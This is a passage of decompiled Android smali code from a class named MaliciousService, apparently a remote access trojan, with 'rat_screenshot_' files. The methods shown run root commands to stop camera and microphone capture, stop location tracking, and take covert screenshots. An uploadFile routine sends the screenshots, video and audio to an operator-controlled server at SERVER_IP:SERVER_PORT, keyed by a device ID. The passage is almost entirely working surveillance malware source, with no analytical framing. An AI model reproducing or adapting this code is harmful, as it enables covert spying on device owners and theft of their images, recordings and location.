    invoke-virtual {v0, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 687
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    move-result v0

    .line 688
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ffmpeg process killed with code: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3b
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_3b} :catch_3e
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_3b} :catch_3c

    .line 691
    goto :goto_59

    .line 689
    :catch_3c
    move-exception v0

    goto :goto_3f

    :catch_3e
    move-exception v0

    .line 690
    :goto_3f
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error stopping live camera: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 692
    :goto_59
    return-void
.end method

.method private stopLiveMic()V
    .registers 6

    .line 695
    const-string v0, "Stopping live microphone capture..."

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 697
    :try_start_7
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "su"

    const/4 v4, 0x0

    aput-object v3, v2, v4

    const-string v3, "-c"

    const/4 v4, 0x1

    aput-object v3, v2, v4

    const-string v3, "pkill arecord"

    const/4 v4, 0x2

    aput-object v3, v2, v4

    invoke-virtual {v0, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 698
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    move-result v0

    .line 699
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "arecord process killed with code: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3b
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_3b} :catch_3e
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_3b} :catch_3c

    .line 702
    goto :goto_59

    .line 700
    :catch_3c
    move-exception v0

    goto :goto_3f

    :catch_3e
    move-exception v0

    .line 701
    :goto_3f
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error stopping live microphone: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 703
    :goto_59
    return-void
.end method

.method private stopLocationUpdates()V
    .registers 3

    .line 827
    iget-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_12

    iget-object v1, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    if-eqz v1, :cond_12

    .line 828
    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    .line 829
    const-string v0, "MaliciousService"

    const-string v1, "Location updates stopped."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 831
    :cond_12
    return-void
.end method

.method private takeScreenshot()V
    .registers 10

    .line 549
    const-string v0, "Screenshot file deleted successfully."

    const-string v1, "Failed to delete screenshot file."

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v2

    const-string v3, "MaliciousService"

    if-nez v2, :cond_15

    .line 550
    const-string v0, "Cannot take screenshot: Permissions not granted."

    invoke-static {v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 551
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 552
    return-void

    .line 554
    :cond_15
    const-string v2, "Attempting to take screenshot..."

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 555
    new-instance v2, Ljava/io/File;

    sget-object v4, Landroid/os/Environment;->DIRECTORY_PICTURES:Ljava/lang/String;

    invoke-static {v4}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "rat_screenshot_"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ".png"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v2, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 556
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    .line 558
    :try_start_46
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const-string v7, "su"

    const/4 v8, 0x0

    aput-object v7, v6, v8

    const-string v7, "-c"

    const/4 v8, 0x1

    aput-object v7, v6, v8

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "screencap -p "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v7, 0x2

    aput-object v4, v6, v7

    invoke-virtual {v5, v6}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 559
    invoke-virtual {v4}, Ljava/lang/Process;->waitFor()I

    move-result v4

    .line 560
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "screencap process exited with code: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 561
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_bb

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v4

    const-wide/16 v6, 0x0

    cmp-long v8, v4, v6

    if-lez v8, :cond_bb

    .line 562
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Screenshot captured: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 563
    const-string v4, "screenshot"

    invoke-direct {p0, v2, v4}, Lcom/example/android/MaliciousService;->uploadFile(Ljava/io/File;Ljava/lang/String;)V

    goto :goto_c0

    .line 565
    :cond_bb
    const-string v4, "Screenshot file not found or empty after capture. Ensure device is rooted or screenshot permissions are available."

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_c0
    .catch Ljava/io/IOException; {:try_start_46 .. :try_end_c0} :catch_d1
    .catch Ljava/lang/InterruptedException; {:try_start_46 .. :try_end_c0} :catch_cf
    .catchall {:try_start_46 .. :try_end_c0} :catchall_cd

    .line 570
    :goto_c0
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_ff

    .line 571
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_fc

    .line 572
    goto :goto_f8

    .line 570
    :catchall_cd
    move-exception v4

    goto :goto_100

    .line 567
    :catch_cf
    move-exception v4

    goto :goto_d2

    :catch_d1
    move-exception v4

    .line 568
    :goto_d2
    :try_start_d2
    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Error taking screenshot: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_ec
    .catchall {:try_start_d2 .. :try_end_ec} :catchall_cd

    .line 570
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_ff

    .line 571
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_fc

    .line 572
    :goto_f8
    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_ff

    .line 574
    :cond_fc
    invoke-static {v3, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 578
    :cond_ff
    :goto_ff
    return-void

    .line 570
    :goto_100
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v5

    if-eqz v5, :cond_113

    .line 571
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_110

    .line 572
    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_113

    .line 574
    :cond_110
    invoke-static {v3, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 577
    :cond_113
    :goto_113
    throw v4
.end method

.method private uploadFile(Ljava/io/File;Ljava/lang/String;)V
    .registers 14

    .line 720
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_23

    .line 721
    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "File to upload does not exist: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 722
    return-void

    .line 724
    :cond_23
    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    if-eqz v0, :cond_26b

    iget-object v0, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    if-eqz v0, :cond_26b

    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v0, :cond_31

    goto/16 :goto_26b

    .line 728
    :cond_31
    nop

    .line 729
    nop

    .line 730
    nop

    .line 731
    const-string v0, "\r\n"

    .line 732
    const-string v2, "--"

    .line 733
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "*****"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 735
    const/4 v4, 0x0

    :try_start_54
    new-instance v5, Ljava/net/URL;

    iget-object v6, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v7, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    iget-object v8, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "http://"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v9, ":"

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/api/upload_"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "/"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 736
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v5

    check-cast v5, Ljava/net/HttpURLConnection;
    :try_end_96
    .catch Ljava/io/IOException; {:try_start_54 .. :try_end_96} :catch_22e
    .catchall {:try_start_54 .. :try_end_96} :catchall_22c

    .line 737
    const/4 v4, 0x1

    :try_start_97
    invoke-virtual {v5, v4}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 738
    invoke-virtual {v5, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 739
    const/4 v4, 0x0

    invoke-virtual {v5, v4}, Ljava/net/HttpURLConnection;->setUseCaches(Z)V

    .line 740
    const-string v6, "POST"

    invoke-virtual {v5, v6}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 741
    const-string v6, "Connection"

    const-string v7, "Keep-Alive"

    invoke-virtual {v5, v6, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 742
    const-string v6, "ENCTYPE"

    const-string v7, "multipart/form-data"

    invoke-virtual {v5, v6, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 743
    const-string v6, "Content-Type"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "multipart/form-data;boundary="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 744
    invoke-virtual {p1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, p2, v6}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 745
    const/16 v6, 0x7530

    invoke-virtual {v5, v6}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 746
    invoke-virtual {v5, v6}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 747
    new-instance v6, Ljava/io/DataOutputStream;

    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 748
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 749
    invoke-virtual {p1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Content-Disposition: form-data; name=\""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "\"; filename=\""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "\""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 750
    const-string v7, "application/octet-stream"

    .line 751
    const-string v8, "screenshot"

    invoke-virtual {p2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_136

    const-string v7, "image/png"

    .line 752
    :cond_136
    const-string v8, "camera"

    invoke-virtual {p2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_140

    const-string v7, "video/mp4"

    .line 753
    :cond_140
    const-string v8, "mic"

    invoke-virtual {p2, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_14a

    const-string v7, "audio/wav"

    .line 754
    :cond_14a
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Content-Type: "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 755
    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 756
    new-instance v7, Ljava/io/FileInputStream;

    invoke-direct {v7, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 757
    const/16 p1, 0x1000

    new-array p1, p1, [B

    .line 759
    :goto_170
    invoke-virtual {v7, p1}, Ljava/io/FileInputStream;->read([B)I

    move-result v8

    const/4 v9, -0x1

    if-eq v8, v9, :cond_17b

    .line 760
    invoke-virtual {v6, p1, v4, v8}, Ljava/io/DataOutputStream;->write([BII)V

    goto :goto_170

    .line 762
    :cond_17b
    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 763
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v6, p1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 764
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->flush()V

    .line 765
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result p1

    .line 766
    const/16 v0, 0xc8

    if-ne p1, v0, :cond_1bc

    .line 767
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    const-string v0, " uploaded successfully."

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_216

    .line 769
    :cond_1bc
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Server responded with non-OK code for "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " upload: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 770
    new-instance p1, Ljava/io/BufferedReader;

    new-instance v0, Ljava/io/InputStreamReader;

    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getErrorStream()Ljava/io/InputStream;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {p1, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_1ea
    .catch Ljava/io/IOException; {:try_start_97 .. :try_end_1ea} :catch_229
    .catchall {:try_start_97 .. :try_end_1ea} :catchall_226

    .line 772
    :try_start_1ea
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 773
    :goto_1ef
    invoke-virtual {p1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_1f9

    .line 774
    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1ef

    .line 776
    :cond_1f9
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error response: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_213
    .catchall {:try_start_1ea .. :try_end_213} :catchall_21c

    .line 777
    :try_start_213
    invoke-virtual {p1}, Ljava/io/BufferedReader;->close()V
    :try_end_216
    .catch Ljava/io/IOException; {:try_start_213 .. :try_end_216} :catch_229
    .catchall {:try_start_213 .. :try_end_216} :catchall_226

    .line 782
    :goto_216
    if-eqz v5, :cond_264

    .line 783
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_264

    .line 770
    :catchall_21c
    move-exception v0

    :try_start_21d
    invoke-virtual {p1}, Ljava/io/BufferedReader;->close()V
    :try_end_220
    .catchall {:try_start_21d .. :try_end_220} :catchall_221

    goto :goto_225

    :catchall_221
    move-exception p1

    :try_start_222
